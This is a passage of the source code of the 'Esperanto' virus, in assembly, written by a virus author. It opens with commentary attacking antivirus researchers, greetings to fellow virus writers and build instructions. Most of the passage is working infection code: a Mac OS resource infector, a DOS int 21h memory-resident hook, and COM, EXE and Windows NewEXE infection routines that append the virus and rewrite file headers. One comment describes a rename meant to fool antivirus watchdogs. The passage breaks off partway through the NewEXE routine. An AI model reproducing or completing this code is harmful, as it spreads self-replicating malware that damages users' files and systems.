; being one of "the chosen", tried to follow Bontchev's steps (he knows what
; i mean). This makes nothing but confirming my opinion on who in the AV si-
; de makes a serious and proffesional work and who prefers to get some noto-
; riousness by trying to create actually inexistent conflicts between VX and
; AV and even between AV and AV themselves, rather than cordiality.
;
; "That's the way they act, that's why their products suck".
;
; And Kaspersky... you rock, but you should stop believing you're a god. Get
; some time to learn a better english and something on Win32 viruses, try to
; approach your previous modest behavior rather than Daniloff's, and that is
; when you'll start to write again those dazzling virus analyses such as the
; unforgettable work you did with Zhengxi.
;
; However i still admire you.
;
;
; 5. Greetings
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; I would like to thank Jacky Qwerty very especially for his big help in the
; Win32 module (as well as in some stupid bugs) :) I wouldn't have been able
; to write the Win32 module without him. What can i say man... thank you ve-
; ry much, you rock ;) Also very special thanks to GriYo, who provided to me
; as well as Jacky very valuable information and code about PE infection un-
; der Win32, when we all (Jacky, GriYo and i) were working on the subject.
;
; A very special greeting also for Vecna, who is nowadays doing the military
; service in Brazil, his country... i'll never forget what you said about my
; virus, we all miss you and hope to see you soon, friend :)
;
; Btw, Guillermito... what about your "virus of the year" contest? ;)
;
;
; 6. Compiling it
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Don't even think on trying to compile the source code below. To do it, you
; should first separate three of the four modules, compile each of them with
; a different mode and/or compiler, and then put again the whole stuff toge-
; ther into one only file, keeping the data area untouched and having to mo-
; dify *every* pointer to it in the viral code.
;
; Better to use the already compiled binary provided by us, right? :) Anyway
; these are the compiling modes, for those of you who are curious about what
; did i use for compiling Esperanto. Btw, the compiler for the Mac OS module
; was CodeWarrior (i had to insert the ASM code inside a C source).
;
;
;  DOS+Windows 3.1x modules
;
; tasm /m espodos.asm
; tlink espodos.obj
; exe2bin espodos.exe espodos.com
;
;  Win32 module
;
; tasm32 -ml -m5 -q -zn espow32.asm
; tlink32 -Tpe -c -x -aa espow32.obj,,, import32.lib
; pewrsec espow32.exe


                .model  tiny
                .code
                 org    0

; ÍÍ¹ Absolute virus start ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                .386                                ; Intel 80386 real mode
espo_start      label   byte                        ; Define virus start
espo_mem_size   equ     espo_mem_end-espo_start     ; Define size in memory
espo_file_size  equ     espo_file_end-espo_start    ; Define size in file
reloc_size      equ     reloc_end-reloc_start       ; Relocation size (NE)
dseta_offset    equ     dseta_byte-espow32_start    ; Dseta-offset size
text_size       equ     text_end-text_start         ; Size of payload text
base_default    equ     400000h                     ; Base default address

; ÄÄ´ Universal entry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Note: this is the entry point for infected COM, EXE and Mac OS files. If
;   the following instruction is executed in an Intel processor, it will jmp
;   to the real entry for COM and EXE files. Otherwise (when running under a
;   Motorola or PowerPC processor) it will be interpreted and executed as if
;   it were plain data, thus being able to reach the real entry for infected
;   Mac OS applications, which starts with a branch to the definitive entry.

com_exe_entry:  jmp     real_ce_entry               ; Jumps only in PCs

; ÍÍ¹ Mac OS module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

espo_header:    bra.s   mac_os_entry                ; Jump to virus code
                dc.w    #$0                         ; Header gaps for later
                dc.l    #'MDEF'                     ; initialization in the
                dc.l    #$0                         ; jump table built by
                dc.l    #$0                         ; the Mac OS Finder

; ÄÄ´ Entry point for Mac OS applications ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

mac_os_entry:   lea     espo_header,a0              ; Copy our code location
                move.l  a0,$9ce                     ; to $9ce (ToolScratch)
                bra     espo_body                   ; for later reference

espo_body:      link    a6,#-$24                    ; Link code address
                movem.l d4-d7/a2-a4,-(sp)           ; Push in our registers
                move.l  $14(a6),d5                  ; Use d5 as ëelta-offset

                movea.l #$a25,a3                    ; In $a25 (MenuFlash),
                move.b  (a3),d0                     ; look for our action
                ext.w   d0                          ; code (3) in order to
                subq.w  #$3,d0                      ; know if our code is
                beq     infect_mac_os               ; already active or not

                move.b  #$3,(a3)                    ; Else switch the flag
                clr.w   d7                          ; on as we're going to
                moveq   #$2,d6                      ; run or handling code
check_offset:   tst.w   d7                          ; Look for our resident
                bne     search_loop                 ; code thru the memory

                movea.l d6,a3                       ; Code apparently found
                move.b  (a3),d0                     ; Now check for our
                ext.w   d0                          ; header and identifiers
                cmpi.w  #'M',d0                     ; Is it an 'M'?
                bne.s   search_loop                 ; Keep on searching

                move.l  a3,d0                       ; First byte is an 'M'
                addq.l  #$1,d0                      ; Now check the 2nd one
                movea.l d0,a0                       ; Move address+1 to a0
                move.b  (a0),d0                     ; Move second byte to d0
                ext.w   d0                          ; Extend d0
                cmpi.w  #'D',d0                     ; Is it a 'D'?
                bne.s   search_loop                 ; Keep on searching

                move.l  a3,d0                       ; Base address to d0
                addq.l  #$2,d0                      ; Checking 3rd byte...
                movea.l d0,a0                       ; Move the address to a0
                move.b  (a0),d0                     ; Move the byte to d0
                ext.w   d0                          ; Extend d0
                cmpi.w  #'E',d0                     ; Is it an 'E'?
                bne.s   search_loop                 ; Keep on searching

                move.l  a3,d0                       ; Base address to d0
                addq.l  #$3,d0                      ; Let's check 4th byte
                movea.l d0,a0                       ; Move its address to a0
                move.b  (a0),d0                     ; Move 4th byte to d0
                ext.w   d0                          ; Extend d0
                cmpi.w  #'F',d0                     ; Is it an 'F'?
                bne.s   search_loop                 ; Keep on searching

                move.l  a3,d0                       ; Restore address in d0
                addq.l  #$4,d0                      ; d0+$4=5th byte to see
                movea.l d0,a0                       ; Move its address to a0
                move.b  (a0),d0                     ; Move 5th byte to d0
                ext.w   d0                          ; Extend d0
                cmpi.w  #$67,d0                     ; Check for Esperanto
                bne.s   search_loop                 ; resource first ID

                move.l  a3,d0                       ; Base address in d0
                addq.l  #$5,d0                      ; Checking 6th byte
                movea.l d0,a0                       ; Move its address to a0
                move.b  (a0),d0                     ; Move the byte to d0
                ext.w   d0                          ; Extend d0
                cmpi.w  #$26,d0                     ; Check for the 2nd ID
                bne.s   search_loop                 ; Wrong ID, search again

                move.l  a3,d0                       ; Get the address for
                addq.l  #$6,d0                      ; the 7th and last byte,
                movea.l d0,a0                       ; which has to be our
                move.b  (a0),d0                     ; 3rd resource ID ($0c)
                ext.w   d0                          ; Extend d0
                cmpi.w  #$0c,d0                     ; Everything ok?
                bne.s   search_loop                 ; Wrong, how bad luck :(

                move.b  #'W',(a3)                   ; Change MDEF to WDEF to
                moveq   #$1,d7                      ; fool some AV watchdogs
search_loop:    addq.l  #$1,d6                      ; and to limit too fast
                cmpi.l  #$30d40,d6                  ; infection, as WDEF is
                ble     check_offset                ; a less called resource

; ÄÄ´ Mac OS applications infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_mac_os:  subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'CODE',-(sp)               ; Push the resource name
                clr.w   -(sp)                       ; we're looking for and
                _GetResource                        ; clear the stack

                movea.l (sp)+,a4                    ; Move address to a4
                subq.w  #$2,sp                      ; Empty stack (2 bytes)
                move.l  a4,-(sp)                    ; Push 'CODE' address
                _HomeResFile                        ; Home resource file

                move.w  (sp)+,d4                    ; Move address to d4
                subq.w  #$2,sp                      ; Empty stack (2 bytes)
                _CurResFile                         ; Current resource file

                move.w  (sp)+,d7                    ; Move address to d7
                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move the resource name
                move.w  #$espo_file_size,-(sp)      ; we're looking for
                _GetResource                        ; (Try to) get it

                movea.l (sp)+,a4                    ; Move address to a4
                move.l  a4,d0                       ; Does it exist?
                bne.s   new_mdef                    ; Go and create it

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move resource name
                pea     first_tab                   ; Move identifier
                _GetNamedResource                   ; Get MDEF address

                movea.l (sp)+,a2                    ; Move its address to a2
                move.l  a2,-(sp)                    ; Push it onto the stack
                _DetachResource                     ; Detach resource

                clr.w   -(sp)                       ; Clear the stack
                _UseResFile                         ; Use the MDEF resource

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move the resource name
                clr.w   -(sp)                       ; Clear one word
                _GetResource                        ; Open the MDEF resource

                movea.l (sp)+,a4                    ; Move handle to a4
                move.l  a4,-(sp)                    ; Push it into the stack
                move.w  #$espo_file_size,-(sp)      ; Move our identifier
                pea     name_only                   ; And push the name tab
                _SetResInfo                         ; Set resource new info

                move.l  a4,-(sp)                    ; Move handle into stack
                _ChangedResource                    ; Resource has changed

                move.l  a4,-(sp)                    ; Move handle into stack
                _WriteResource                      ; Write a new MDEF res.

                move.l  a2,-(sp)                    ; Stack original address
                move.l  #'MDEF',-(sp)               ; Stack resource name
                clr.w   -(sp)                       ; Clear one word
                pea     second_tab                  ; Viral res.ID string
                _AddResource                        ; Add new resource

                clr.w   -(sp)                       ; Clear one word
                _UpdateResFile                      ; Update resource file

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Now open again the
                move.w  #$espo_file_size,-(sp)      ; MDEF resource in order
                _GetResource                        ; to complete infection

                movea.l d5,a0                       ; Move our delta to a0
                movea.l (a0),a0                     ; Move 1st byte to a0
                move.l  (sp)+,$6(a0)                ; Move MDEF address to
                move.w  d7,-(sp)                    ; a0+$6 and use the CODE
                _UseResFile                         ; resource (addr.in d7)
                bra     calc_new_size               ; Calculate new size

new_mdef:       movea.l d5,a0                       ; Move ëelta to a0
                move.l  (a0),a0                     ; Move 1st byte to a0
                move.l  a4,$6(a0)                   ; Move address for MDEF
                clr.w   -(sp)                       ; to a0+$6 and call
                _UseResFile                         ; UseResFile function

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move resource name
                clr.w   -(sp)                       ; Clear one word
                _Get1Resource                       ; Get a new resource

                movea.l (sp)+,a2                    ; Move its address to a2
                move.l  a2,-(sp)                    ; Push a2 into the stack
                _DetachResource                     ; Detach the new resource

                move.w  d4,-(sp)                    ; Use current resource
                _UseResFile                         ; file previously stored

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move resource name
                clr.w   -(sp)                       ; Clear one word
                _Get1Resource                       ; Get the new resource

                movea.l (sp)+,a4                    ; Move address to a4
                move.l  a4,d0                       ; Is this address busy?
                bne.s   address_used                ; Branch if so

                move.l  a2,-(sp)                    ; Stack resource address
                move.l  #'MDEF',-(sp)               ; Move resource name
                clr.w   -(sp)                       ; Clear one word
                pea     second_tab                  ; Resource identifier
                _AddResource                        ; Add new resource

                subq.w  #$2,sp                      ; Empty stack (2 bytes)
                _CurResFile                         ; Current resource file
                _UpdateResFile                      ; Update resource file
                bra.s   calc_new_size               ; Calculate new size

address_used:   move.w  d7,-(sp)                    ; Use current resource
                _UseResFile                         ; file previously stored

                subq.w  #$4,sp                      ; Empty stack (4 bytes)
                move.l  #'MDEF',-(sp)               ; Move resource name
                clr.w   -(sp)                       ; Clear one word
                _Get1Resource                       ; Get one resource

                movea.l (sp)+,a4                    ; Move its address to a4
                move.l  a4,d0                       ; Compare it again
                bne.s   calc_new_size               ; Branch if not equal

                move.l  a2,-(sp)                    ; Stack resource address
                move.l  #'MDEF',-(sp)               ; Move resource name
                clr.w   -(sp)                       ; Clear one word
                pea     second_tab                  ; Resource ID string
                _AddResource                        ; Add new resource

                subq.w  #$2,sp                      ; Empty stack (2 bytes)
                _CurResFile                         ; Current resource file
                _UpdateResFile                      ; Update resource file

calc_new_size:  move.l  d5,-(sp)                    ; Move delta into stack
                _CalcMenuSize                       ; Calculate new menu size

                movem.l (sp)+,d4-d7/a2-a4           ; Restore used registers
                unlk    a6                          ; Unlink code address
                movea.l (sp)+,a0                    ; Move original address
                lea     $12(sp),sp                  ; to a0, restore stack
                jmp     (a0)                        ; and jump back to it

                dc.l    #'MAIN'                     ; Main code module
                dc.w    #$2020                      ; Pre-initialized gaps
                dc.w    #$2020                      ; for Mac OS Finder

; ÄÄ´ Data area for Mac OS module ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

first_tab:      dc.w    #$16                        ; For _GetNamedResource
second_tab:     dc.b    #$7                         ; For _AddResource
name_only:      dc.l    #'Esperanto'                ; For _SetResInfo

; ÍÍ¹ DOS runtime module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

real_ce_entry:  call    delta_offset                ; Get ë-offset in BP in
delta_offset:   pop     bp                          ; the traditional and
                sub     bp,offset delta_offset      ; always effective way :)
                push    es cs                       ; Segment push/popping
                pop     ds                          ; for l8r use in our code

                mov     ax,':)'                     ; Residency check
                int     21h                         ; Are we home?

                cmp     ax,';)'                     ; Winky smiley, we are
                je      work_done                   ; already resident...

go_mem_res:     mov     ax,es                       ; Residency routine
                dec     ax                          ; Get our host's MCB
                mov     ds,ax                       ; segment and point its
                xor     di,di                       ; start with DI

                cmp     byte ptr ds:[di],'Y'        ; Is it a Z block?
                jna     work_done                   ; Exit if it is not

                sub     word ptr ds:[di+3],((espo_mem_size/10h)+2)
                sub     word ptr ds:[di+12h],((espo_mem_size/10h)+2)
                add     ax,word ptr ds:[di+3]
                inc     ax                          ; Get a new MCB segment
                                                    ; for the viral code
                mov     ds,ax
                mov     byte ptr ds:[di],'Z'        ; Mark it as a Z block
                mov     word ptr ds:[di+1],8        ; And as a system block
                mov     word ptr ds:[di+3],((espo_mem_size/10h)+1)
                mov     dword ptr ds:[di+8],00534f44h ; Owner ID -> DOS
                inc     ax

                cld                                 ; Clear direction flag
                push    cs                          ; Point with CS and DS
                pop     ds                          ; to the code running now
                mov     es,ax                       ; ES = virus segment
                mov     cx,espo_file_size           ; CX = virus size
                mov     si,bp                       ; SI = virus start
                rep     movsb                       ; Copy virus to memory

                push    es                          ; Now jump to our copy
                push    offset copy_vector          ; in memory so we don't
                retf                                ; have to use ë-offset

copy_vector:    push    ds                          ; Save DS in the stack
                mov     ds,cx                       ; DS = CX = 0 -> IVT
                mov     si,21h*4                    ; Point int 21h vector
                lea     di,old_int_21h              ; Point our storage
                movsd                               ; Store old vector

                mov     word ptr [si-4],offset new_int_21h
                mov     word ptr [si-2],ax

                pop     ax                          ; Once we've set the
                mov     ds,ax                       ; new int 21h vector,
                mov     es,ax                       ; check out our host

work_done:      cmp     byte ptr ds:[bp+file_flag],'C' ; Is our host a COM?
                je      restore_com                 ; Yes, restore it

restore_exe:    pop     es                          ; In case it's an EXE
                mov     ax,es                       ; file, get PSP segment
                add     ax,10h                      ; and adjust it to
                add     word ptr ds:[bp+exe_cs],ax  ; execute our host code

                cli                                 ; Clear interrupts
                mov     sp,word ptr ds:[bp+exe_sp]  ; Set new SP
                add     ax,word ptr ds:[bp+exe_ss]  ; Get SS and add to it
                mov     ss,ax                       ; the PSP+10h value
                sti                                 ; Set interrupts

                xor     ax,ax                       ; Set the value of all
                xor     bx,bx                       ; these registers to 0
                xor     cx,cx                       ; so it seems that
                cwd                                 ; nothing has happened
                xor     si,si                       ; and we've not been
                xor     di,di                       ; here infecting :)

                push    word ptr ds:[bp+exe_cs]     ; Push initial segment
                push    word ptr ds:[bp+exe_ip]     ; Push initial offset
                xor     bp,bp                       ; And jump into there!
                retf

restore_com:    lea     si,[bp+old_com_header]      ; Point to the buffer
                mov     di,100h                     ; in which we've stored
                push    ds di                       ; the original COM header
                movsd                               ; and copy it (5 bytes)
                movsb                               ; to its entrypoint
                retf                                ; Jump to CS:IP

; ÍÍ¹ Windows 3.1x module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

newexe_entry:   pusha                               ; Push our registers
                push    ds es                       ; And save segments

                mov     ax,0ah                      ; Get a writable alias
                mov     bx,cs                       ; selector of CS in AX
                int     31h                         ; and move it to DS
                mov     ds,ax

                mov     byte ptr ds:[file_or_mem],'F' ; Runtime infection
                mov     ah,4eh                        ; Find first file
find_more_com:  xor     cx,cx                         ; No special attribs
                mov     byte ptr ds:[inf_counter],cl  ; inf_counter = 0
                lea     dx,ds:[com_wildcard]        ; Look for COM files
                int     21h                         ; to infect only in
                jc      other_search                ; current directory

                mov     ah,2fh                      ; Get DTA address in
                int     21h                         ; ES:BX and point to it

                add     bx,1eh                      ; BX+1eh -> filename
                xchg    dx,bx                       ; ES:DX -> filename
                mov     byte ptr ds:[file_flag],'C' ; Switch the COM flag on
                jmp     check_com                   ; And jump for it!

other_search:   mov     ah,4eh                      ; Now let's look for
find_more_exe:  xor     cx,cx                       ; EXE files (only in the
                lea     dx,ds:[exe_wildcard]        ; current directory) as
                int     21h                         ; there are not more
                jc      restore_ne                  ; COM files to infect

                mov     ah,2fh                      ; Get DTA address in
                int     21h                         ; ES:BX and point to it

                add     bx,1eh                      ; BX+1eh -> filename
                xchg    dx,bx                       ; ES:DX -> filename
                mov     byte ptr ds:[file_flag],'E' ; Switch the EXE flag on
                jmp     check_exe                   ; And jump for it!

restore_ne:     pop     es ds                       ; Pop our segments and
                popa                                ; reggs from the stack

                db      0eah                        ; jmp xxxx:xxxx
newexe_ip       dw      ?                           ; Original offset
newexe_cs       dw      0ffffh                      ; Original segment

; ÍÍ¹ DOS memory resident module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

new_int_21h:    cmp     ax,':)'                     ; Our residency check?
                jne     more_checks                 ; Nope, more checks...

                inc     ah                          ; Turn ":)" into ";)"
                iret                                ; Interrupt return

more_checks:    cmp     ah,4eh                      ; Find first file?
                je      findfirst                   ; Yes, it's our time!

                cmp     ah,4fh                      ; Find next file?
                je      findnext                    ; Our time again! :)

return_to_int:  db      0eah                        ; jmp xxxx:xxxx
old_int_21h     dw      ?,?                         ; Original int 21h

; ÄÄ´ Findfirst (4eh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

findfirst:      pusha                               ; Push'em onto the stack
                push    es cs                       ; Push ES as well so we
                pop     es                          ; now change it to CS

                cld                                 ; Clear direction flag
                mov     si,dx                       ; DS:DX/SI -> filename
                lea     di,filename                 ; ES:DI -> name buffer
                mov     word ptr cs:[file_offset],di ; Filename offset

get_path:       lodsb                               ; Load a byte of path
                or      al,al                       ; The end of the path?
                je      no_more_path                ; Jump if so to work...

                stosb                               ; Store it in the buffer
                cmp     al,':'                      ; Possible end of path?
                je      update_offset               ; Then update offset

                cmp     al,'\'                      ; Possible end of path?
                jne     get_path                    ; Update filename offset

update_offset:  mov     word ptr cs:[file_offset],di ; New filename offset
                jmp     get_path                    ; Get more characters

no_more_path:   pop     es                          ; Restore ES from stack
                popa                                ; And the other registers

; ÄÄ´ Findnext (4fh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

findnext:       pushf                               ; Push flags in the stack
                call    dword ptr cs:[old_int_21h]  ; Call original int 21h

                pushf                               ; Push flags again
                pusha                               ; Now push registers
                push    ds es                       ; And now segments

lets_work:      cld                                 ; Clear direction flag
                mov     ah,2fh                      ; Get Disk Transfer Area
                int     21h                         ; (DTA) in ES:BX

                mov     di,word ptr cs:[file_offset] ; DI -> filename offset
                mov     si,bx                       ; Now point with DS:SI
                add     si,1eh                      ; to the name in DTA

                push    cs es                       ; New DS = old ES
                pop     ds es                       ; New ES = old CS

get_name:       lodsb                               ; Load byte from DS:SI
                stosb                               ; And store it in ES:DI
                cmp     al,'.'                      ; Look for extension
                jne     not_a_dot                   ; Have we reached it?

                mov     word ptr cs:[dot_xy],di     ; Then store its offset
not_a_dot:      or      al,al                       ; End of filename?
                jne     get_name                    ; Keep on getting it

                push    cs                          ; Push CS and pop DS
                pop     ds                          ; so they're the same

                lea     dx,filename                 ; DS:DX -> filename
                mov     di,word ptr ds:[dot_xy]     ; DS:DI -> extension
                mov     byte ptr cs:[file_or_mem],'M'

                cmp     word ptr ds:[di],'XE'       ; Is it an EXE file?
                je      check_exe                   ; Seems so...

                cmp     word ptr ds:[di],'OC'       ; Maybe a COM file?
                jne     pop_and_leave               ; If not, pop and leave

; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_com:      push    ds es                       ; DS = ES (to open files
                pop     ds                          ; in DS:DX and ES:DX)

                mov     ax,3d02h                    ; Open the file we've
                int     21h                         ; found in DS:DX (from
                xchg    bx,ax                       ; memory) or ES:DX (from
                pop     ds                          ; the runtime infection)

                call    system_checks               ; Do some checks in
                or      ah,ah                       ; order to know if we
                jz      close_and_pop               ; may infect the file

                mov     ah,3fh                      ; Read its first five
                mov     cx,5                        ; bytes to our buffer
                lea     dx,old_com_header           ; and check if the file
                int     21h                         ; is already infected

                cmp     word ptr ds:[old_com_header+3],');'
                je      close_and_pop               ; File is infected

                call    lseek_end                   ; Now check its size
                cmp     ax,(0fc17h-espo_file_size)  ; 65535-virus-1000
                jae     close_and_pop               ; Is it is too large?

                cmp     ax,(espo_file_size+3e8h)    ; And now see if it's
                jbe     close_and_pop               ; too small (virus+1000)

; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_com:     mov     byte ptr ds:[file_flag],'C' ; Set the COM flag in
                inc     byte ptr ds:[inf_counter]   ; Increment the counter
                push    ax                          ; AX -> filesize

                mov     ah,40h                      ; Append our code to
                mov     cx,espo_file_size           ; the file we're about
                lea     dx,espo_start               ; to infect, leaving
                int     21h                         ; out the data buffers

                pop     ax                          ; Filesize in AX
                sub     ax,3                        ; Calcul8 the new jmp
                mov     word ptr ds:[new_com_header+1],ax ; And write it

                call    lseek_start                 ; Lseek to the start

                mov     ah,40h                      ; And now write our new
                mov     cx,5                        ; header -0e9h,?,?,;)-
                lea     dx,new_com_header           ; which jumps straight
                int     21h                         ; to the viral code

close_and_pop:  mov     ah,3eh                      ; Close the file we've
                int     21h                         ; just infected

pop_and_leave:  cmp     byte ptr ds:[file_or_mem],'M' ; Memory infection?
                je      memory_exit                 ; Yes, jump back to it

                cmp     byte ptr ds:[inf_counter],3 ; Have we reached the
                je      restore_ne                  ; infection limit?

                mov     ah,4fh                      ; If not, look for more
                cmp     byte ptr ds:[file_flag],'C' ; files to infect, both
                je      find_more_com               ; EXE and COM, depending
                jmp     find_more_exe               ; on their availability

memory_exit:    pop     es ds                       ; Jump back to the int
                popa                                ; 21h handler and keep
                popf                                ; on intercepting 4eh
                retf    2                           ; and 4fh to infect

; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_exe:      push    ds es                       ; DS = ES (to open files
                pop     ds                          ; in DS:DX and ES:DX)

                mov     ax,3d02h                    ; Open the file we've
                int     21h                         ; found in DS:DX (from
                xchg    bx,ax                       ; memory) or ES:DX (from
                pop     ds                          ; the runtime infection)

                call    system_checks               ; Do some checks in
                or      ah,ah                       ; order to know if we
                jz      close_and_pop               ; may infect the file

                mov     ah,3fh                      ; Read its first 41h
                mov     cx,41h                      ; bytes into our read
                lea     dx,old_exe_header           ; buffer and point it
                mov     si,dx                       ; with DS:DX and DS:SI
                int     21h

                mov     ax,word ptr ds:[si]         ; First word in AX
                add     ah,al                       ; Add the 2 first bytes
                cmp     ah,'M'+'Z'                  ; And check for the MZ
                jne     close_and_pop               ; mark (DOS EXE files)

                cmp     word ptr ds:[si+12h],');'   ; Have we already
                je      close_and_pop               ; infected the file?

                cmp     word ptr ds:[si+1ah],0      ; We don't like evil
                jne     close_and_pop               ; overlays :P

                cmp     word ptr ds:[si+1eh],'KP'   ; Nor PkLited EXE files,
                je      close_and_pop               ; they plainly suck

                call    lseek_end                   ; Lseek to the end of
                cmp     ax,(espo_file_size+3e8h)    ; the file and check if
                jbe     close_and_pop               ; it's too small for us

                cmp     byte ptr ds:[si+18h],40h    ; Is it a WinXX file?
                je      check_winexe                ; Yep, go for it!

; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_exe:     mov     byte ptr ds:[file_flag],'E' ; Set the EXE flag in
                inc     byte ptr ds:[inf_counter]   ; Increment the counter

                push    ax dx                       ; DX:AX -> file size
                mov     cx,10h                      ; CX -> paragraph size
                div     cx                          ; Now divide the length
                sub     ax,word ptr ds:[si+8]       ; Header size in paras
                add     dx,offset com_exe_entry     ; Add the entry offset

                push    ax                          ; AX = new EXE CS
                xchg    word ptr ds:[si+16h],ax     ; Exchange the values
                mov     word ptr ds:[exe_cs],ax     ; Save old EXE CS
                pop     ax                          ; Restore AX from stack

                push    dx                          ; DX = new EXE IP
                xchg    word ptr ds:[si+14h],dx     ; Exchange the values
                mov     word ptr ds:[exe_ip],dx     ; Save old EXE IP
                pop     dx                          ; Restore DX from stack

                add     dx,offset espo_file_end+320h ; Add 320h to the virus
                and     dl,0feh                     ; size in order to set SP

                xchg    word ptr ds:[si+0eh],ax     ; Exchange the values
                mov     word ptr ds:[exe_ss],ax     ; And save old EXE SS

                xchg    word ptr ds:[si+10h],dx     ; Exchange the values
                mov     word ptr ds:[exe_sp],dx     ; And save old EXE SP
                pop     dx ax                       ; DX:AX -> file size

                add     ax,espo_file_size           ; Add virus size to AX
                adc     dx,0                        ; And add with carry
                mov     cx,200h                     ; CX -> page size
                div     cx                          ; Divide the length
                inc     ax                          ; Increment one page
                mov     word ptr ds:[si+2],dx       ; Bytes in last page
                mov     word ptr ds:[si+4],ax       ; Pages in EXE file
                mov     word ptr ds:[si+12h],');'   ; Set our own mark

                mov     ah,40h                      ; Append our code to
                mov     cx,espo_file_size           ; the end of the EXE
                lea     dx,espo_start               ; file we've almost
                int     21h                         ; infected :P

                call    lseek_start                 ; Lseek to start

                mov     ah,40h                      ; And now write the
                mov     cx,1ch                      ; new header with the
                mov     dx,si                       ; updated pointers
                int     21h                         ; instead of the old one
go_away:        jmp     close_and_pop               ; Close file and exit

; ÄÄ´ NewEXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_winexe:   lea     di,winexe_data              ; Point to our buffer
                mov     ax,word ptr ds:[si+3ch]     ; Save the pointer to
                mov     word ptr ds:[di],ax         ; the new EXE header

                mov     word ptr ds:[si+12h],');'   ; Set our infection mark
                sub     word ptr ds:[si+3ch],8      ; Substract a quadword
                cmp     word ptr ds:[si+3eh],0      ; Enough room for us?
                jne     go_away                     ; Oops... shit... :(

                call    lseek_start                 ; Lseek to start

                mov     ah,40h                      ; Write in the changes
                mov     cx,40h                      ; we've just made in
                mov     dx,si                       ; the pointers of the
                int     21h                         ; MZ header of the file

                mov     dx,word ptr ds:[di]         ; Lseek to the new EXE
                call    lseek_middle                ; header (MZ+[3ch])

                mov     ah,3fh                      ; Read 200h bytes from
                mov     cx,200h                     ; the start of the new
                mov     dx,si                       ; EXE file to our buffer
                int     21h                         ; and point to it

                cmp     word ptr ds:[si],'EP'       ; Is it a PE file?
                je      check_pe                    ; Go and eat it!

                cmp     word ptr ds:[si],'EN'       ; Maybe a NewEXE file?
                jne     bad_winexe                  ; Argh! that's bad luck

                cmp     word ptr ds:[si+36h],802h   ; Does it have gangload
                je      infect_newexe               ; area? good to know ;)

                call    lseek_start                 ; Lseek to start of the
bad_winexe:     mov     ah,3fh                      ; file and read again
                mov     cx,41h                      ; the MZ header because
                mov     dx,si                       ; we have to remodify it
                int     21h

                add     word ptr ds:[si+3ch],8      ; Update the pointer to
                call    lseek_start                 ; the new EXE header

                mov     ah,40h                      ; And rewrite the MZ
                mov     cx,40h                      ; header, stored in our
                mov     dx,si                       ; read buffer (pointed
                int     21h                         ; by DS:DX and DS:SI)
                jmp     close_and_pop               ; Close file and exit

; ÄÄ´ NewEXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

infect_newexe:  inc     byte ptr ds:[inf_counter]   ; Increment the counter
